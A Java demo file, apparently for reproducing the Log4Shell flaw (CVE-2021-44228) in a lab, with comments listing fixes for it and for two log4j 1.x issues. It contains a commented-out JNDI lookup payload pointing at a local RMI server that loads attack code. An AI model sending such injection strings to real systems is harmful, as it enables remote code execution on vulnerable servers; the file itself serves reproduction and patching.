package security;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        // run this code directly, you will see sth in the console like
        // hello, Java version 1.8.0_111
        // OR
        // run the RMIServer first, and use the rmi string as the name and run this code again,
        // you will see in the console
        // run in AttackObj...
        // the hack code will be executed first
        // to fix this security leak(CVE-2021-44228), just add a prop value for log4j2, see the log4j2.component.properties

        // solutions:
        // for log4j2 version > 2.10.x,
        // 1. add the prop value LOG4J_FORMAT_MSG_NO_LOOKUPS=true
        // OR
        // 2. upgrade to the latest version of log4j2

        // for log4j2 version < 2.10
        // the prop value does not work
        // need to upgrade to the latest version

        // higher version of JDK is also helpful.
        String name = "${java:version}";
//        String name = "${jndi:rmi://127.0.0.1:1099/attack}";
        logger.error("hello, {}", name);

        // for log4j 1.2.x, cannot reproduce this issue, but a similar security issue(CVE-2021-4104) was found
        // the hackers need to get the read and write permission for the log4j.properties file
        // and the issue is only with JMS appender, so it's not as terrible as the CVE-2021-44228 one.

        // solutions:
        // 1. remove all the JMS appender config from log4j.properties
        // 2. delete the JMSAppender class file from log4j jar if can
        // zip -q -d log4j-*.jar org/apache/log4j/net/JMSAppender.class

        // another security issue for log4j 1.2.x is CVE-2019-17571, related to the class org.apache.log4j.net.SocketServer
        // if someone built Socket server with org.apache.log4j.net.SocketServer class to collect the logs from other web servers
        // then the hackers can send some attack codes via the Socket port.

        // solutions:
        // don't build socket server with org.apache.log4j.net.SocketServer

        // log4j 1.x is deprecated, so it's better to upgrade log4j to the latest version

        // kafka and zookeeper are not on the list of impacted lib with log4j2 issue
    }
}
